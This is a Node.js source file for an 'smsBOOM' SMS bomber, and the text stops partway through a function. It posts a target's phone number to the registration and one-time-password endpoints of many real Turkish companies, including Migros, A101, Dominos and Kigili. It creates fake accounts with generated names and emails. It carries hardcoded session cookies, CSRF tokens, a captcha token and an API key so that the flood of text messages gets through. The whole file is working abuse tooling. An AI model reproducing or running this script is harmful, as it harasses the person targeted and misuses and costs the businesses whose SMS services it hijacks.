const request = require('request');
const colors = require('colors');
const title = require('./title.js');
const moment = require('moment');
const faker = require('faker');

async function delay(s) { return new Promise(resolve => setTimeout(resolve, s * 1000)); }

async function smsBOOM(numara, miktar) {
    let dataFSms = {
        baslangic_tarihi: moment().format('DD.MM.YYYY HH:mm:ss'),
        numara: numara,
        hatali: 0,
        basarili: 0,
    };

    // random mail

    function generateRandomEmail() {
        return faker.internet.email();
    }

    function kigili(no) {
        request.post({
            url: 'https://www.kigili.com/users/registration/',
            form: {
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "email": faker.internet.email(),
                "phone": "0"+no,
                "password": "nwejkfıower32",
                "confirm": "true",
                "kvkk": "true",
                "next": ""
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] Kigili - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Kigili - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function kahvedunyasi(no) {
        request.post({
            url: 'https://core.kahvedunyasi.com/api/users/sms/send',
            form: {
                "mobile_number": no,
                "token_type": "register_token"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Kahve Dunyasi - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Kahve Dunyasi - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function naosstars(no) {
        request.post({
            url: 'https://shop.naosstars.com/users/register',
            form: {
                "email": faker.internet.email(),
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "password": "nwejkfıower32",
                "date_of_birth": "1999-01-01",
                "phone": "0"+no,
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] Naosstars - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Naosstars - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function wmf(no) {
        request.post({
            url: 'https://www.wmf.com.tr/users/register/',
            form: {
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": faker.internet.email(),
                "email_allowed": "true",
                "first_name": faker.name.firstName(),
                "gender": "male",
                "last_name": faker.name.lastName(),
                "password": "nwejkfıower32",
                "phone": "0"+no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] WMF - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] WMF - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function bim(no) {
        request.post({
            url: 'https://bim.veesk.net:443/service/v1.0/account/login',
            json: {
                "phone": no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Bim - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Bim - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function sok(no) {
        request.post({
            url: 'https://api.ceptesok.com:443/api/users/sendsms',
            json: {
                "mobile_number": no,
                "token_type": "register_token"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Sok - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Sok - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function migros(no) {
        request.post({
            url: 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp',
            json: {
                "phoneNumber": no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Migros - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Migros - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function a101(no) {
        request.post({
            url: 'https://www.a101.com.tr:443/users/otp-login/',
            json: {
                "phone": "0"+no,
                "next": "/a101-kapida"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] A101 - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] A101 - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function englishhome(no) {
        request.post({
            url: 'https://www.englishhome.com:443/enh_app/users/registration/',
            form: {
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "email": faker.internet.email(),
                "phone": "0"+no,
                "password": "nwejkfıower32",
                "email_allowed": "true",
                "sms_allowed": "true",
                "confirm": "true",
                "tom_pay_allowed": "true"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Englishhome - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Englishhome - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function sakasu(no) {
        request.post({
            url: 'https://www.sakasu.com.tr:443/app/api_register/step1',
            form: {
                "phone": "0"+no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Sakasu - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Sakasu - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
    
    function tiklagelsin(no) {
		request("https://www.tiklagelsin.com/user/graphql", {
		  "headers": {
			"accept": "*/*",
			"accept-language": "tr,tr-TR;q=0.9,en-US;q=0.8,en;q=0.7",
			"content-type": "application/json",
			"sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
			"sec-ch-ua-mobile": "?0",
			"sec-ch-ua-platform": "\"Windows\"",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"x-device-type": "3",
			"x-merchant-type": "0",
			"x-no-auth": "true",
			"Referer": "https://www.tiklagelsin.com/a/",
			"Referrer-Policy": "strict-origin-when-cross-origin"
		  },
		  "body": `{\"operationName\":\"GENERATE_OTP\",\"variables\":{\"phone\":\"+90${no}",\"challenge\":\"85033055-4b81-4f6f-aed2-4a8ee1dce968\",\"deviceUniqueId\":\"web_6f59c0e5-3a0a-4bd3-907d-3cd973152333\"},\"query\":\"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\\n  generateOtp(\\n    phone: $phone\\n    challenge: $challenge\\n    deviceUniqueId: $deviceUniqueId\\n  )\\n}\\n\"}`,
		  "method": "POST"
		}, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Tıkla Gelsin - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Tıkla Gelsin - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
	}

    // mopas
    function mopas(no) {
        const randomEmail = generateRandomEmail();
    
        request.get({
            url: `https://mopas.com.tr/sms/activation?mobileNumber=${no}&pwd=&checkPwd=`,
            headers: {
                'Accept': 'text/plain, */*; q=0.01',
                'Accept-Language': 'tr-TR,tr;q=0.8',
                'Connection': 'keep-alive',
                'Referer': 'https://mopas.com.tr/login',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-GPC': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'Accept-Encoding': 'gzip',
            },
            jar: request.jar(),
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                console.log(`[+] Mopas - ${no} - Başarılı`.green);
            } else {
                console.log(`[-] Mopas - ${no} - Hatalı`.red);
            }
        });
    }
    
    module.exports = mopas;
    
    function salonrandevu(no) {
        const randomEmail = generateRandomEmail();
    
        request.post({
            url: 'https://api.salonrandevu.com/api/v1/register',
            headers: {
                'authority': 'api.salonrandevu.com',
                'accept': '*/*',
                'accept-language': 'tr-TR,tr;q=0.8',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://salonrandevu.com',
                'referer': 'https://salonrandevu.com/',
                'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'accept-encoding': 'gzip',
            },
            body: JSON.stringify({
                phone: no,
                mail: randomEmail,
                dialCode: '+90'
            })
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                console.log(`[+] Salon Randevu - ${no} - Başarılı`.green);
            } else {
                console.log(`[-] Salon Randevu - ${no} - Hatalı`.red);
            }
        });
    }
    
    module.exports = salonrandevu;

    // enzahome

    function enzahome(no) {
        const randomEmail = generateRandomEmail();
    
        const options = {
            method: 'POST',
            url: 'https://www.enzahome.com.tr/users/register/',
            headers: {
                'authority': 'www.enzahome.com.tr',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'tr-TR,tr;q=0.5',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://www.enzahome.com.tr',
                'referer': 'https://www.enzahome.com.tr/users/auth/?next=/account/',
                'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'x-csrftoken': 'EJavrvCDkvi94ViAQOfgX8yGSAGkkmlluqLiE0si7qJQCvVjXYY9aWegy8Mz76pS',
                'accept-encoding': 'gzip',
                'cookie': 'csrftoken=jr4tm9Gd3n2lwQ1I9QT7netH1ZTiuXHb98FgzEwSQit24qErg0C0A29hHxZxhHLI; sessionid=w147h1mlyvq7i9tp3l4idfta3evwxo4e; personaclick_session_code=JgZrGUh6ma; personaclick_device_id=BPJMmiT3jx; personaclick_lazy_recommenders=true; personaclick-popup-183=showed; personaclick_session_last_act=1700251756097'
            },
            json: {
                email: randomEmail,
                first_name: faker.name.firstName(),
                last_name: faker.name.lastName(),
                password: faker.internet.password(),
                phone: '0' + no,
                sms_allowed: true,
                confirm: true,
                email_allowed: true,
                call_allowed: true
            }
        };
    
        request(options, function (error, response, body) {
            if (response && response.statusCode == 200) {
                console.log(`[+] Enzahome - ${no} - Başarılı`.green);
            } else {
                console.log(`[-] Enzahome - ${no} - Hatalı`.red);
            }
        });
    }

    // samsonite

    async function samsonite(no) {
        const randomEmail = generateRandomEmail();
    
        const headers = {
            'authority': 'www.samsonite.com.tr',
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.samsonite.com.tr',
            'referer': 'https://www.samsonite.com.tr/register/?next=/',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            'accept-encoding': 'gzip',
            'cookie': 'csrftoken=NejtFpi1FekUIBzQ6zhganC00yWCzNOxXuV9mo3215EhJBqBSNw1aFDAZTLBrPfS; ajs_group_id=null; ajs_user_id=%22None%22; ajs_anonymous_id=%2267d1b953-4749-433a-bc7e-ab1e18033fbe%22; strw-1941-vt=0_1700251912996; strw-1941-tpvc=2; strw-1941-spvc=2; strw-1941-ttt=33; strw-1941-stt=33; strw-1941-ptt=33',
        };
    
        const data = `csrfmiddlewaretoken=6pZYhgNu4AJbSrgYiz0lloMOOG5CoolsgFBEYfyvqr3yTr7J4Nf6lGNoN1UBgqMN&first_name=sezer&last_name=y%C4%B1lmaz&email=${randomEmail}&date_of_birth=2000-07-04&phone_country=%2B90&phone=%2B90${no}&password=sezeryok123!&email_allowed=true&sms_allowed=true&confirm=true`;
    
        try {
            const response = await axios.post('https://www.samsonite.com.tr/users/registration/', data, { headers });
            console.log('[+] Samsonite - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] Samsonite - ' + no + ' - Hatalı'.red);
        }
    }

    // hamidiye su

    const axios = require('axios');

    function hamidiyesu(no) {
    const randomEmail = generateRandomEmail();

    const headers = {
        'authority': 'onlinebayi.hamidiye.istanbul',
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://siparis.hamidiye.istanbul',
        'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': 'Windows',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        'accept-encoding': 'gzip',
    };

    const data = `first_name=sezer&last_name=y%C4%B1lmaz&phone=${no}&email=${randomEmail}&password=sezeryokki123!&campaign_permissions=false&mobile_notification=true&sms_notification=true&email_notification=true`;

    try {
        const response = axios.post('https://onlinebayi.hamidiye.istanbul/api/register/', data, { headers });
        console.log('[+] Hamidiye - ' + no + ' - Başarılı'.green);
    } catch (error) {
        console.error('[-] Hamidiye - ' + no + ' - Hatalı'.red);
    }
}

    // zubizu

    async function zubizu(no) {
        const randomEmail = generateRandomEmail();
    
        const headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'tr-TR,tr;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json; charset=UTF-8',
            'Origin': 'https://www.zubizu.com',
            'Referer': 'https://www.zubizu.com/uye-olun',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'Accept-Encoding': 'gzip',
        };
    
        const cookies = 'VL_FirstVisitTime=2023-11-25 21:51:07; VL_VisitStartTime=2023-11-25 21:51:07; VL_TotalVisit=1; OfferMiner_ID=RUMLETQUTWIQLEMY20231125215107; OM_INW=1; OMB_New=1; VL_FirstReferrer=https://www.google.com/?; VL_LastPageViewTime=2023-11-25 21:51:37; VL_LastPVTimeForTD=2023-11-25 21:51:37; VL_TotalDuration=30; VL_TotalPV=2; VL_PVCountInVisit=2; OM_rDomain=https%3A%2F%2Fwww.zubizu.com%2F%3F; G_ENABLED_IDPS=google';
    
        const data = {
            MobilePhone: no,
            PhoneNumberCode: 90,
            CountryCode: 'tr',
            Email: randomEmail,
        };
    
        try {
            const response = await axios.post('https://www.zubizu.com/Registration/Register', data, {
                headers,
                withCredentials: true,
                headers: {
                    'Cookie': cookies,
                },
            });
            console.log('[+] Zubizu - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] Zubizu - ' + no + ' - Hatalı'.red);
        }
    }

    // dsmart

    async function dsmart(no) {
        const headers = {
            'authority': 'api-crm4.ercdn.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'tr-TR,tr;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://www.dsmartgo.com.tr',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'accept-encoding': 'gzip',
        };
    
        const data = {
            CodeType: 'PreVerification',
            Method: 'Sms',
            Language: 'TR',
            Mobile: '+90' + no,
        };
    
        try {
            const response = await axios.post('https://api-crm4.ercdn.com/membership/verification/send?key=ac3f095f717f2665f3e8787d8f62ebc1', data, {
                headers,
            });
            console.log('[+] D-Smart - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] D-Smart - ' + no + ' - Hatalı'.red);
        }
    }

    // netspeed

    async function netspeed(no) {
        const headers = {
            'authority': 'www.netspeed.com.tr',
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.netspeed.com.tr',
            'referer': 'https://www.netspeed.com.tr/',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            'accept-encoding': 'gzip',
        };
    
        const data = `name=muhammet+elmas&phone=${no}`;
    
        try {
            const response = await axios.post('https://www.netspeed.com.tr/Home/CallUs', data, {
                headers,
            });
            console.log('[+] Netspeed - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] Netspeed - ' + no + ' - Hatalı'.red);
        }
    }

    // houseofsuperstep

    async function houseofsuperstep(no) {
        const headers = {
            'authority': 'www.houseofsuperstep.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'tr-TR,tr;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://www.houseofsuperstep.com',
            'referer': 'https://www.houseofsuperstep.com/users/login/?next=/',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'x-csrftoken': 'knUjGtwQSg6tMpckBLMK3lJcSw1Et6L0P6QDskACJ3BzZaBLnLfkazGCjFM8gBuV',
            'accept-encoding': 'gzip',
        };
    
        const randomEmail = generateRandomEmail();
    
        const data = {
            email: randomEmail,
            first_name: faker.name.firstName(),
            last_name: faker.name.lastName(),
            date_of_birth: '1995-03-01',
            password: faker.internet.password(),
            phone: '0' + no,
            sms_allowed: true,
            email_allowed: true,
            gender: 'male',
            confirm: true,
            kvkk_confirm: true,
            call_allowed: true,
        };
    
        try {
            const response = await axios.post('https://www.houseofsuperstep.com/users/register/', data, {
                headers,
            });
            console.log('[+] House of Superstep - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] House of Superstep - ' + no + ' - Hatalı'.red);
        }
    }

    // mudo

    async function mudo(no) {
        const headers = {
            'authority': 'www.mudo.com.tr',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'tr-TR,tr;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.mudo.com.tr',
            'referer': 'https://www.mudo.com.tr/users/register/?next=',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'x-csrftoken': '41z0lriVXri2WlAH0QF093K1K2O2sw3bC0RUHVaOdahevfDJYSPsLeuTUytcAZr6',
            'accept-encoding': 'gzip',
        };
    
        const randomEmail = generateRandomEmail();
    
        const data = {
            email: randomEmail,
            sms_allowed: true,
            email_allowed: true,
            first_name: faker.name.firstName(),
            last_name: faker.name.lastName(),
            date_of_birth: '1999-04-03',
            gender: null,
            confirm: true,
            password: faker.internet.password(),
            phone: no,
            add_loyalty: true,
        };
    
        try {
            const response = await axios.post('https://www.mudo.com.tr/users/register/', data, {
                headers,
            });
            console.log('[+] Mudo - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] Mudo - ' + no + ' - Hatalı'.red);
        }
    }

    // occasion

    async function occasion(no) {
        const headers = {
            'authority': 'www.occasion.com.tr',
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.occasion.com.tr',
            'referer': 'https://www.occasion.com.tr/register/?next=/account/profile/',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            'accept-encoding': 'gzip',
        };
    
        const randomEmail = generateRandomEmail();
    
        const data = `next=%2Faccount%2Fprofile%2F&date_of_birth=17-08-1987&first_name=sezer&last_name=yilmaz&email=${randomEmail}&phone=0${no}&gender=male&password=Skidlamer123!&is_allowed=true&confirm=true&sms_allowed=true&email_allowed=true&call_allowed=true&permissions=true&sms_allowed=true&email_allowed=true&call_allowed=true`;
    
        try {
            const response = await axios.post('https://www.occasion.com.tr/users/registration/', data, {
                headers,
            });
            console.log('[+] Occasion - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] Occasion - ' + no + ' - Hatalı'.red);
        }
    }

    // sportive

    async function sportive(no) {
        const headers = {
            'authority': 'www.sportive.com.tr',
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.sportive.com.tr',
            'referer': 'https://www.sportive.com.tr/login/',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            'accept-encoding': 'gzip',
        };
    
        const randomEmail = generateRandomEmail();
    
        const data = `csrfmiddlewaretoken=OSlomaD8qVMpWKZLS3Ykm07aHzrKV1M7vM474KfU2TNXGnyevDKjBsHHJRSBT1Gh&first_name=sezer&last_name=y%C4%B1lmaz&email=${randomEmail}&phone=0${no}&date_of_birth=1994-06-16&password=Skidlamer123!&email_allowed=false&sms_allowed=true&contact_allowed=true&confirm=true&confirm-2=true&next=`;
    
        try {
            const response = await axios.post('https://www.sportive.com.tr/users/registration/', data, {
                headers,
            });
            console.log('[+] Sportive - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] Sportive - ' + no + ' - Hatalı'.red);
        }
    }

    // dominos

    async function dominos(no) {
        const headers = {
            'authority': 'frontend.dominos.com.tr',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'tr-TR,tr;q=0.9',
            'appversion': 'WEB-3.0',
            'authorization': 'Bearer',
            'content-type': 'application/json',
            'origin': 'https://www.dominos.com.tr',
            'referer': 'https://www.dominos.com.tr/',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'accept-encoding': 'gzip',
            'cookie': 'Dominos.appVersionPublic=1.4.35; cf_clearance=ZhCBWgbRaXdQlS7pyq6ZvvkLwvpMtI1msCnGCd4Z1qw-1700955013-0-1-771ed29a.ba3ab83.c1b71343-0.2.1700955013',
        };
    
        const randomEmail = generateRandomEmail();
    
        const data = {
            email: randomEmail,
            mobilePhone: no,
            captchaToken: '03AFcWeA7xw6ownXyEFbLVRA1ltspH9mLRsXO68umP6jmNmz8aOxO2CWHZOLV56LfHqYWSWF69ks-NnHycwAJr6Yi5GGqQCx4MRp8uQuuVZioJZR8tSTDFtCpSBlaE6RzHb3g9FzrDbSGnD7VDQIdFw1UHxyFHHcjZ9VXyFmiL2jeVYsNm-3zBNETwlPpfh8KpmUjn1JpwJJRkOfb2MAI-dV1wm0K5cbToA_KW3QjMMLInJE0NLDOexKobCnfEUIeMA98_CNzhWOE5sHs0kw8zKO-JG2kGKnJvHCJtyczLZLA0-mNU2OFS-sh7UznlPisD-mMS4ckwWitUUbrIFU1vfvVB5VIebbYlxADpc4qnWV5huOQnQOu3WXyzgvZ9Vks-qM6Hhfr71fd_92QPWJa0MVsG_YQ72z_zCF4JWGP6X0od-ey6KQ3mKXUyW7_Xwf9b8iSxxlJwWlmUeJbLbPdNU6sf6GUuAqLEuOIbTxrvCSpHxfBESAsRCMb86ZXwXbOwj0jTfaaS1NOrNDTWNyJUrgDCSmILbsVLwWNxLbVsdgtIUFUS0XjBNgA',
            isSure: false,
            channelCode: 'WEB',
        };
    
        try {
            const response = await axios.post('https://frontend.dominos.com.tr/api/customer/sendOtpCode', data, {
                headers,
            });
            console.log('[+] Dominos - ' + no + ' - Başarılı'.green);
        } catch (error) {
            console.error('[-] Dominos - ' + no + ' - Hatalı'.red);
        }
    }

    // kredim

    async function kredim(no) {
        const headers = {
            'authority': 'api.kredim.com.tr',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'tr-TR,tr;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://member.kredim.com.tr',
            'referer': 'https://member.kredim.com.tr/',
            'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
